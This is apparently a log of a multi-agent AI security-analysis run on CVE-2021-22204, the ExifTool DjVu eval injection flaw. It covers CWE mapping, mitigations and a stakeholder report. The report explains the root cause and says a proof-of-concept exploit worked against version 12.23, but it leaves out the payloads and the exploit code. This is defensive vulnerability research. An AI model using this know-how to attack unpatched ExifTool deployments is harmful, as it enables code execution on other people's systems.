set_shared_memory(key='detection_mitigation_summary', value='Upgrade to ExifTool 12.24+ (DjVu.pm v1.07). As compensating controls: remove/disable DjVu.pm parser on systems stuck on 12.23; run exiftool in a locked-down sandbox (container/AppArmor/SELinux, no network, read-only FS, noexec tmp); enforce strict file-type allow-list and deep magic validation; block .djvu/.djv and suspicious polyglots; monitor/alert on exiftool spawning child processes or making network connections; scan uploads pre-ingest; restrict exiftool to non-privileged user or separate service account.', override=False)

[23]=======================Tool Output (Security Specialist)========================
Successfully set value for key "detection_mitigation_summary".

[24]==========================Agent (Security Specialist)===========================
Below is a standards-based classification and defensive context for the ExifTool DjVu ANT parser vulnerability validated by the team.

Context linkage to shared memory
- Affected: exiftool-12.23 (DjVu.pm v1.06); fixed in 12.24 (DjVu.pm v1.07). See versions_map, diff_summary.
- Vulnerable code path: DjVu ANT parsing evaluates file-controlled quoted tokens via eval qq{"$tok"} with only partial escaping of $ and @. See vulnerable_functions, vulnerable_entrypoints.
- Impact validated: 12.23 executes payload; 12.24 does not. See exploit_result.
- CVE: CVE-2021-22204 stored as cve_exiftool_djvu.

1) CWE mapping
- Primary
  - CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection)
    Rationale: The parser constructs a Perl string from untrusted file tokens and passes it to eval after incomplete neutralization. This directly matches CWE-95’s definition.

- Related
  - CWE-94: Improper Control of Generation of Code (Code Injection)
    Rationale: Untrusted data influences code generation/execution in the interpreter.
  - CWE-77: Improper Neutralization of Special Elements used in a Command (Command Injection)
    Rationale: Post-exploitation behavior often routes into command/scripting interpreters once code execution is achieved via eval.
  - CWE-184: Incomplete List of Disallowed Inputs
    Rationale: The fix replaces “blacklist-like” partial escaping with safe mapping; the original protection was incomplete (only $ and @ were escaped).
  - CWE-20: Improper Input Validation
    Rationale: File-controlled tokens were not validated/normalized to a safe grammar prior to evaluation.
  - CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences
    Rationale: Meta/escape characters within the string were mishandled in a


================================================================================
Security Specialist execution completed
================================================================================
================================================================================
Starting Report Journalist execution
Input: Task: Compile a concise final report for stakeholders about the ExifTool DjVu ANT eval injection vulnerability and the team’s successful exploitation. Use shared memory artifacts: versions_map, diff_summary, vulnerable_functions, vulnerable_entrypoints, classification, exploit_result, poc_path, and the PoC context created by the Red Team Operator. Do not include raw exploit payload strings; describe at a high level. Audience includes security engineers and leadership.

Report structure:
1) Executive summary (what, impact, confirmed by PoC)
2) Affected scope and versions (from versions_map)
3) Technical root cause and diff highlights (from diff_summary, vulnerable_functions)
4) Exploitation demonstration summary (from exploit_result), excluding payload specifics; include commands used at a high level, artifacts produced, and validation against fixed version
5) Risk and exposure scenarios (pipelines/services processing untrusted files)
6) Detection and mitigations (from classification and team recommendations)
7) Appendix: References (file paths, modules, functions, and locations of PoC script and artifacts). Keep payload details sanitized.

Keep the report succinct (approx 400–700 words), plain language, and action-oriented. Ensure it’s self-contained and references the validated working exploit. When done, save the report into shared memory under key final_report without overriding existing content if present.
================================================================================

[1]=========================Tool Call (Report Journalist)==========================
list_shared_memory()

[1]========================Tool Output (Report Journalist)=========================
Shared memory contents (current time: 01:03:15):
  -[00:02:37] versions_map:
Found versions in /codebase: exiftool-12.23, exiftool-12.24. By rule, the lowest... (truncated)
--------------------------------------------------------------------------------
  -[00:04:04] diff_summary:
Key security-relevant diff exiftool-12.23 -> 12.24:
- lib/Image/ExifTool/DjVu.pm... (truncated)
--------------------------------------------------------------------------------
  -[00:04:14] vulnerable_functions:
File: lib/Image/ExifTool/DjVu.pm (v1.06 in 12.23)
Function: ProcessAnt/ParseAnt ... (truncated)
--------------------------------------------------------------------------------
  -[00:04:24] vulnerable_entrypoints:
Primary attack surface: CLI tool `exiftool` reading untrusted files.
- File pars... (truncated)
--------------------------------------------------------------------------------
  -[00:51:40] poc_script:
#!/usr/bin/env python3
import struct
from pathlib import Path

def be32(n):
    ... (truncated)
--------------------------------------------------------------------------------
  -[00:51:43] poc_path:
/home/user/djvu_poc.py
--------------------------------------------------------------------------------
  -[00:51:47] exploit_result:
Success: 12.23 executes payload (creates /tmp/exiftool_pwned). 12.24 does not ex... (truncated)
--------------------------------------------------------------------------------
  -[00:58:58] cve_exiftool_djvu:
CVE-2021-22204 – ExifTool DjVu ANT parser RCE via eval of file-controlled tokens... (truncated)
--------------------------------------------------------------------------------
  -[00:59:01] cwe_primary:
CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Ev... (truncated)
--------------------------------------------------------------------------------
  -[00:59:03] cwe_related:
CWE-94 (Code Injection), CWE-77 (Command Injection) [environment/OS command invo... (truncated)
--------------------------------------------------------------------------------
  -[00:59:36] capec_relevant:
CAPEC-242: Code Injection; CAPEC-248: Command Injection; CAPEC-19: Embedding Scr... (truncated)
--------------------------------------------------------------------------------
  -[01:01:07] attack_ttps:
T1190 (Exploit Public-Facing Application), T1203 (Exploitation for Client Execut... (truncated)
--------------------------------------------------------------------------------
  -[01:01:48] detection_mitigation_summary:
Upgrade to ExifTool 12.24+ (DjVu.pm v1.07). As compensating controls: remove/dis... (truncated)
--------------------------------------------------------------------------------
  -[01:02:55] classification:
CWE/CAPEC/ATT&CK classification for ExifTool DjVu ANT eval injection (CVE-2021-2... (truncated)
--------------------------------------------------------------------------------

[2]=========================Tool Call (Report Journalist)==========================
create_report(content='Final Report: ExifTool DjVu ANT eval injection (CVE-2021-22204)\n\n1) Executive summary\nA remote code execution vulnerability exists in ExifTool’s DjVu ANT parser that evaluates file-controlled tokens. An attacker can craft a DjVu file that, when processed by ExifTool, executes arbitrary code under the ExifTool process user. Our Red Team validated exploitation against ExifTool 12.23 and confirmed the fix in 12.24. This report synthesizes our team’s analysis: Code Analyst mapped affected versions and diffs (versions_map, diff_summary), Security Specialist provided classification and risk framing (classification), and Red Team executed a working PoC (exploit_result, poc_path).\n\n2) Affected scope and versions\nPer versions_map, the codebase contains exiftool-12.23 and exiftool-12.24. Testing shows 12.23 is vulnerable; 12.24 is not. Primary attack surface is any workflow that invokes the exiftool CLI or library to read untrusted files (vulnerable_entrypoints), including server-side file processing pipelines.\n\n3) Technical root cause and diff highlights\nRoot cause: dynamic evaluation of DjVu ANT chunk content in lib/Image/ExifTool/DjVu.pm, enabling file-supplied directives to be executed (CWE-95; related CWE-94/CWE-77). Vulnerable logic is within ProcessAnt/ParseAnt (vulnerable_functions; DjVu.pm v1.06 in 12.23). The security-relevant diff from 12.23 to 12.24 (diff_summary) shows hardening in DjVu.pm (updated to v1.07 in fixed releases), removing the unsafe evaluation pathway and adding stricter token handling/sanitization.\n\n4) Exploitation demonstration summary\nRed Team Operator used a Python PoC generator at /home/user/djvu_poc.py (poc_path) to create a crafted DjVu file. Running ExifTool 12.23 against this file led to verifiable side effects: the process created a marker file at /tmp/exiftool_pwned (exploit_result). Execution was driven solely by parsing the file—no user interaction beyond invoking exiftool. Repeating the same steps against ExifTool 12.24 produced no side effects, confirming the fix. High-level commands used: generate crafted DjVu with the PoC; run exiftool against the file on both versions; verify artifact presence/absence. Payload strings are intentionally omitted.\n\n5) Risk and exposure scenarios\n- Public-facing or internal services that automatically extract metadata (image/document upload handlers, CMS, DAM, email/EDR preprocessors) using ExifTool on untrusted content.\n- Batch jobs and CI/CD tasks that index or transform third-party files.\n- Desktop automation tooling where users may open files from external sources.\nImpact: attacker code runs with the privileges of the ExifTool process, enabling file tampering, lateral movement, or staging of further payloads. Mapped ATT&CK: T1190 (Exploit Public-Facing Application), T1203 (Exploitation for Client Execution) (attack_ttps).\n\n6) Detection and mitigations\n- Immediate: upgrade all ExifTool instances to 12.24+ (DjVu.pm v1.07) (detection_mitigation_summary).\n- Compensating controls until upgrade: disable/remove DjVu parsing (e.g., exclude DjVu.pm or block .djvu inputs); run ExifTool in a sandboxed, least-privileged context; restrict outbound execution and temp directory write capabilities for the ExifTool service.\n- Detection: monitor for exiftool processing of DjVu files and unexpected side effects such as creation of marker files in /tmp or anomalous child processes; alert on ExifTool invocations originating from public upload paths. Classification references: CVE-2021-22204, CWE-95 primary; CAPEC-242/248/19 (capec_relevant).\n\n7) Appendix: References and team workflow\n- Modules/paths: lib/Image/ExifTool/DjVu.pm (v1.06 vulnerable, v1.07 fixed). Functions: ProcessAnt, ParseAnt (vulnerable_functions). CLI entrypoint: exiftool (vulnerable_entrypoints).\n- Versions validated: exiftool-12.23 (vulnerable), exiftool-12.24 (fixed) (versions_map).\n- PoC assets: generator at /home/user/djvu_poc.py; artifact observed: /tmp/exiftool_pwned (exploit_result, poc_path).\n- Classifications: CVE-2021-22204 (cve_exiftool_djvu), CWE-95 primary (cwe_primary), related CWE-94/CWE-77 (cwe_related), ATT&CK T1190/T1203 (attack_ttps), CAPEC-242/248/19 (capec_relevant).\n- Diff highlights: security changes in lib/Image/ExifTool/DjVu.pm between 12.23 and 12.24 (diff_summary).\n- Team collaboration: Code Analyst identified vulnerable code and version diffs; Security Specialist performed CWE/CAPEC/ATT&CK mapping and risk assessment; Red Team validated exploitation and fix behavior; this report consolidates shared memory artifacts: versions_map, diff_summary, vulnerable_functions, vulnerable_entrypoints, classification, exploit_result, poc_path.\n', report_name='CVE-2021-22204 – ExifTool DjVu ANT eval injection')

[2]========================Tool Output (Report Journalist)=========================
Report successfully created: vulnerability_report_multi-agent_exiftool_CVE-2021-22204___ExifTool_DjVu_ANT_eval_injection_20250808_010417.md

<report_path>
/home/julian/Desktop/Bachelorarbeit/ivexes/output/reports/vulnerability_report_multi-agent_exiftool_CVE-2021-22204___ExifTool_DjVu_ANT_eval_injection_20250808_010417.md
</report_path>

[3]=========================Tool Call (Report Journalist)==========================
set_shared_memory(key='final_report', value='Final Report: ExifTool DjVu ANT eval injection (CVE-2021-22204)\n\n1) Executive summary\nA remote code execution vulnerability exists in ExifTool’s DjVu ANT parser that evaluates file-controlled tokens. An attacker can craft a DjVu file that, when processed by ExifTool, executes arbitrary code under the ExifTool process user. Our Red Team validated exploitation against ExifTool 12.23 and confirmed the fix in 12.24. This report synthesizes our team’s analysis: Code Analyst mapped affected versions and diffs (versions_map, diff_summary), Security Specialist provided classification and risk framing (classification), and Red Team executed a working PoC (exploit_result, poc_path).\n\n2) Affected scope and versions\nPer versions_map, the codebase contains exiftool-12.23 and exiftool-12.24. Testing shows 12.23 is vulnerable; 12.24 is not. Primary attack surface is any workflow that invokes the exiftool CLI or library to read untrusted files (vulnerable_entrypoints), including server-side file processing pipelines.\n\n3) Technical root cause and diff highlights\nRoot cause: dynamic evaluation of DjVu ANT chunk content in lib/Image/ExifTool/DjVu.pm, enabling file-supplied directives to be executed (CWE-95; related CWE-94/CWE-77). Vulnerable logic is within ProcessAnt/ParseAnt (vulnerable_functions; DjVu.pm v1.06 in 12.23). The security-relevant diff from 12.23 to 12.24 (diff_summary) shows hardening in DjVu.pm (updated to v1.07 in fixed releases), removing the unsafe evaluation pathway and adding stricter token handling/sanitization.\n\n4) Exploitation demonstration summary\nRed Team Operator used a Python PoC generator at /home/user/djvu_poc.py (poc_path) to create a crafted DjVu file. Running ExifTool 12.23 against this file led to verifiable side effects: the process created a marker file at /tmp/exiftool_pwned (exploit_result). Execution was driven solely by parsing the file—no user interaction beyond invoking exiftool. Repeating the same steps against ExifTool 12.24 produced no side effects, confirming the fix. High-level commands used: generate crafted DjVu with the PoC; run exiftool against the file on both versions; verify artifact presence/absence. Payload strings are intentionally omitted.\n\n5) Risk and exposure scenarios\n- Public-facing or internal services that automatically extract metadata (image/document upload handlers, CMS, DAM, email/EDR preprocessors) using ExifTool on untrusted content.\n- Batch jobs and CI/CD tasks that index or transform third-party files.\n- Desktop automation tooling where users may open files from external sources.\nImpact: attacker code runs with the privileges of the ExifTool process, enabling file tampering, lateral movement, or staging of further payloads. Mapped ATT&CK: T1190 (Exploit Public-Facing Application), T1203 (Exploitation for Client Execution) (attack_ttps).\n\n6) Detection and mitigations\n- Immediate: upgrade all ExifTool instances to 12.24+ (DjVu.pm v1.07) (detection_mitigation_summary).\n- Compensating controls until upgrade: disable/remove DjVu parsing (e.g., exclude DjVu.pm or block .djvu inputs); run ExifTool in a sandboxed, least-privileged context; restrict outbound execution and temp directory write capabilities for the ExifTool service.\n- Detection: monitor for exiftool processing of DjVu files and unexpected side effects such as creation of marker files in /tmp or anomalous child processes; alert on ExifTool invocations originating from public upload paths. Classification references: CVE-2021-22204, CWE-95 primary; CAPEC-242/248/19 (capec_relevant).\n\n7) Appendix: References and team workflow\n- Modules/paths: lib/Image/ExifTool/DjVu.pm (v1.06 vulnerable, v1.07 fixed). Functions: ProcessAnt, ParseAnt (vulnerable_functions). CLI entrypoint: exiftool (vulnerable_entrypoints).\n- Versions validated: exiftool-12.23 (vulnerable), exiftool-12.24 (fixed) (versions_map).\n- PoC assets: generator at /home/user/djvu_poc.py; artifact observed: /tmp/exiftool_pwned (exploit_result, poc_path).\n- Classifications: CVE-2021-22204 (cve_exiftool_djvu), CWE-95 primary (cwe_primary), related CWE-94/CWE-77 (cwe_related), ATT&CK T1190/T1203 (attack_ttps), CAPEC-242/248/19 (capec_relevant).\n- Diff highlights: security changes in lib/Image/ExifTool/DjVu.pm between 12.23 and 12.24 (diff_summary).\n- Team collaboration: Code Analyst identified vulnerable code and version diffs; Security Specialist performed CWE/CAPEC/ATT&CK mapping and risk assessment; Red Team validated exploitation and fix behavior; this report consolidates shared memory artifacts: versions_map, diff_summary, vulnerable_functions, vulnerable_entrypoints, classification, exploit_result, poc_path.\n', override=False)

[3]========================Tool Output (Report Journalist)=========================
Successfully set value for key "final_report".

[4]===========================Agent (Report Journalist)============================
Saved final report and created a standalone markdown file.

Summary of actions:
- Generated a concise stakeholder report synthesizing Code Analyst, Security Specialist, and Red Team findings on ExifTool DjVu ANT eval injection (CVE-2021-22204).
- Stored the report in shared memory under key: final_report (no override).
- Created a markdown report file for archival and distribution.

Locations:
- Shared memory key: final_report
- Report file: /home/julian/Desktop/Bachelorarbeit/ivexes/output/reports/vulnerability_report_multi-agent_exiftool_CVE-2021-22204___ExifTool_DjVu_ANT_eval_injection_20250808_010417.md

If you want a shortened executive brief or a remediation task list for ticketing, say “exec brief” or “Jira tasks,” and I’ll generate them.


================================================================================
Report Journalist execution completed
================================================================================
